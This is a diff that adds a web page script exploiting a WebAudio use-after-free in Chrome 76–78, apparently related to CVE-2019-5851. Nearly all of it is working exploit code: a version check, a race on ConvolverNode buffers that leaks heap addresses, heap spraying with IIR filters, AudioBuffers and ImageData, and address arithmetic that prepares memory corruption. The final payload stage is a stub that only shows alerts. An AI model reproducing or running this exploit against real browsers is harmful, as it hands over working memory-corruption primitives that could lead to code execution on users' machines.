@@ -1,0 +1,353 @@
+<script>
+function main() {
+    try {
+        var browserVersion = navigator.userAgent.split("Chrome/")[1].split(" Safari/")[0];
+        majorVersion = parseInt(browserVersion.substr(0, 2));
+        if (majorVersion != 77 && majorVersion != 76 && majorVersion != 78) {
+            return;
+        }
+    } catch (e) {
+        throw new Error("Unsupported browser version.");
+    }
+
+    function later(delay) {
+        return new Promise(resolve => setTimeout(resolve, delay))
+    }
+
+    var iirFilters = [];
+    var floatArray = new Float32Array(10);
+    var audioBufferArray1 = [];
+    var imageDataArray = [];
+    var audioBufferArray2 = [];
+
+    function strPadLeft(x, width) {
+        let pad = "0".repeat(width);
+        let result = pad + x;
+        return result.slice(result.length - width, result.length)
+    }
+
+    function bnReverse(u64) {
+        var result = BigInt(0);
+        var tmp = u64;
+
+        for (var i = 0; i < 8; i++) {
+            result = result << BigInt(8);
+            result += tmp & BigInt(0xFF);
+            tmp = tmp >> BigInt(8);
+        }
+
+        return result;
+    }
+
+    function bnClearLow21(u64) {
+        var mask = (BigInt(1) << BigInt(21)) - BigInt(1);
+        var result = u64 & ~mask;
+        return result;
+    }
+
+    function bnCombine(u64, value) {
+        var masked = bnClearLow21(u64);
+        var shifted = value << BigInt(14);
+        var result = masked + shifted;
+
+        return result;
+    }
+
+    function bnGetMiddle(u64) {
+        var mask = (BigInt(1) << BigInt(21)) - BigInt(1);
+        var result = (u64 & mask) >> BigInt(14);
+
+        return result;
+    }
+
+    function bnToString(u64) {
+        var hi = (u64 & BigInt(0xFFFFFFFF00000000)) >> BigInt(32);
+        var lo = u64 & BigInt(0xFFFFFFFF);
+
+        return "0x" + strPadLeft(hi.toString(16), 8) + "`" + strPadLeft(lo.toString(16), 8);
+    }
+
+    function bnDecodeToString(u64) {
+        var result = "";
+
+        for (let i = 0; i < 8; i++) {
+            var byte = Number(u64 & BigInt(0xFF));
+            if (byte != BigInt(0))
+                result += String.fromCharCode(byte);
+
+            u64 = u64 >> BigInt(8);
+        }
+
+        return result;
+    }
+
+    var garbageCollector = [];
+
+    //
+    // Exploit (I bet it should be similar to unreleased CVE-2019-5851?).
+    //
+
+    function initialSetup() {
+        var audioCtx = new OfflineAudioContext(1, 20, 3000);
+
+        var feedForward = new Float64Array(2);
+        var feedback = new Float64Array(1);
+
+        feedback[0] = 1;
+        feedForward[0] = 0;
+        feedForward[1] = -1;
+
+        for (let i = 0; i < 256; i++)
+            iirFilters.push(audioCtx.createIIRFilter(feedForward, feedback))
+    }
+
+    function sprayMemory() {
+        var promise = new Promise(function(cb) {
+            var arg;
+            for (let i = 0; i < 400; i++)
+                new ArrayBuffer(1024 * 1024 * 60).buffer; // spray 60 MBs each time
+            cb(arg)
+        });
+        return promise;
+    }
+
+    async function triggerUaF(doneCb) {
+        var audioCtx = new OfflineAudioContext(2, 1024 * 1024 * 4, 48000);
+        var bufferSource = audioCtx.createBufferSource();
+        var convolver = audioCtx.createConvolver();
+        var scriptNode = audioCtx.createScriptProcessor(0x4000, 1, 1);
+        var channelBuffer = audioCtx.createBuffer(1, 1, 48000);
+
+        convolver.buffer = channelBuffer;
+        bufferSource.buffer = channelBuffer;
+
+        bufferSource.loop = true;
+        bufferSource.loopStart = 0;
+        bufferSource.loopEnd = 1;
+
+        channelBuffer.getChannelData(0).fill(0);
+
+        bufferSource.connect(convolver);
+        convolver.connect(scriptNode);
+        scriptNode.connect(audioCtx.destination);
+
+        bufferSource.start();
+
+        var finished = false;
+
+        scriptNode.onaudioprocess = function(evt) {
+            for (let i = 0; i < 1; i++) {
+                var channelDataArray = new Uint32Array(evt.inputBuffer.getChannelData(i).buffer);
+
+                for (let j = 0; j < channelDataArray.length; j++) {
+                    if (j + 1 < channelDataArray.length && channelDataArray[j] != 0 && channelDataArray[j + 1] != 0) {
+                        var u64Array = new BigUint64Array(1);
+                        var u32Array = new Uint32Array(u64Array.buffer);
+                        u32Array[0] = channelDataArray[j + 0];
+                        u32Array[1] = channelDataArray[j + 1];
+
+                        var leakedAddr = bnReverse(u64Array[0]);
+                        if (leakedAddr >> BigInt(32) > BigInt(0x8000))
+                            leakedAddr -= BigInt(0x800000000000);
+                        var maskedAddr = bnClearLow21(leakedAddr);
+
+                        var checkValue = leakedAddr < BigInt(0xFFFFFFFFFFFF) && leakedAddr > BigInt(0xFFFFFFFF);
+                        if (checkValue) {
+                            finished = true;
+                            evt = null;
+
+                            bufferSource.disconnect();
+                            scriptNode.disconnect();
+                            convolver.disconnect();
+
+                            setTimeout(function() {
+                                doneCb(leakedAddr);
+                            }, 1);
+
+                            return;
+                        }
+                    }
+                }
+            }
+        };
+
+        audioCtx.startRendering().then(function(buffer) {
+            buffer = null;
+
+            if (!finished) {
+                finished = true;
+                triggerUaF(doneCb);
+
+            }
+        });
+
+        while (!finished) {
+            convolver.buffer = null;
+            convolver.buffer = channelBuffer;
+
+            await later(1); // wait 1 second
+        }
+    }
+
+    initialSetup();
+
+    triggerUaF(function(addr) {
+        alert('UaF triggered, got info leak: ' + bnToString(addr));
+
+        var audioCtx = new OfflineAudioContext(1, 1, 3000);
+
+        var offset = undefined;
+        switch (majorVersion) {
+            case 78:
+                offset = BigInt(-0x13);
+                break;
+            case 77:
+                offset = BigInt(-0x1A);
+                break;
+            case 76:
+                offset = BigInt(-0x19);
+                break;
+        }
+
+	// otherAddr = (addr & 0x1FFFFF) >> 14
+	// otherAddr += offset (offset is negative!)
+	// otherAddr = (addr & ~0x1FFFFF) + ((otherAddr & 0x1FFFFF) << 14)
+	// otherAddr |= 0xFF0
+        var otherAddr = bnCombine(addr, bnGetMiddle(addr) + offset) + BigInt(0xFF0);
+
+        heapSpray(bnReverse(otherAddr), async function() {
+            for (let i = 0; i < 256; i++) {
+                floatArray.fill(0);
+
+                iirFilters[i].getFrequencyResponse(floatArray, floatArray, floatArray);
+
+                if (floatArray[0] != 3.1415927410125732) {
+                    await sprayMemory();
+
+                    audioBufferArray2 = [];
+
+                    for (let j = 0; j < 80; j++)
+                        audioBufferArray1.push(audioCtx.createBuffer(1, 2, 10000));
+
+                    iirFilters = new Array(1);
+
+                    await sprayMemory();
+
+                    for (let j = 0; j < 336; j++)
+                        imageDataArray.push(new ImageData(1, 2));
+
+                    imageDataArray = new Array(30);
+
+                    await sprayMemory();
+
+                    for (let j = 0; j < audioBufferArray1.length; j++) {
+                        var data = new BigUint64Array(audioBufferArray1[j].getChannelData(0).buffer);
+                        if (data[0] != BigInt(0)) {
+                            alert('leaked addr #2:' + bnToString(bnReverse(data[0])));
+                            kickPayload(data, otherAddr);
+                            return;
+                        }
+                    }
+
+                    return;
+                }
+            }
+        });
+    });
+
+    async function heapSpray(addr, doneCb) {
+        var counter = 0;
+        var numChannels = 1;
+
+        var audioCtx = new OfflineAudioContext(1, 1024 * 1024, 48000);
+
+        var bufferSource = audioCtx.createBufferSource();
+        var convolver = audioCtx.createConvolver();
+
+        var bigAudioBuffer = audioCtx.createBuffer(numChannels, 256, 48000);
+        var smallAudioBuffer = audioCtx.createBuffer(numChannels, 2, 48000);
+
+        smallAudioBuffer.getChannelData(0).fill(0);
+
+        for (let i = 0; i < numChannels; i++) {
+            var channelDataArray = new BigUint64Array(bigAudioBuffer.getChannelData(i).buffer);
+            channelDataArray[0] = addr;
+        }
+
+        bufferSource.buffer = bigAudioBuffer;
+        convolver.buffer = smallAudioBuffer;
+
+        bufferSource.loop = true;
+        bufferSource.loopStart = 0;
+        bufferSource.loopEnd = 1;
+
+        bufferSource.connect(convolver);
+        convolver.connect(audioCtx.destination);
+
+        bufferSource.start();
+
+        var finished = false;
+
+        audioCtx.startRendering().then(function(buffer) {
+            buffer = null;
+
+            if (finished) {
+                buffer = null;
+                audioCtx = null;
+
+                setTimeout(doneCb, 200);
+                return;
+            } else {
+                finished = true;
+
+                setTimeout(function() {
+                    heapSpray(addr, doneCb);
+                }, 1);
+            }
+        });
+
+        while (!finished) {
+            counter++;
+
+            convolver.buffer = null;
+
+            await later(1); // wait 1 second
+
+            if (finished)
+                break;
+
+            for (let i = 0; i < iirFilters.length; i++) {
+                floatArray.fill(0);
+                iirFilters[i].getFrequencyResponse(floatArray, floatArray, floatArray);
+
+                if (floatArray[0] != 3.1415927410125732) {
+                    finished = true;
+
+                    audioBufferArray2.push(audioCtx.createBuffer(1, 1, 10000));
+                    audioBufferArray2.push(audioCtx.createBuffer(1, 1, 10000));
+
+                    bufferSource.disconnect();
+                    convolver.disconnect();
+
+                    return;
+                }
+            }
+
+            convolver.buffer = smallAudioBuffer;
+
+            await later(1); // wait 1 second
+        }
+    }
+
+    async function kickPayload(u64Array, t) {
+        alert('heap sprayed!');
+
+        alert('leaked addr #3: ' + bnToString(bnReverse(u64Array[0])));
+        alert('leaked addr #4: ' + bnToString(t));
+
+        // TODO: the rest...
+    };
+}
+
+main();
+</script>
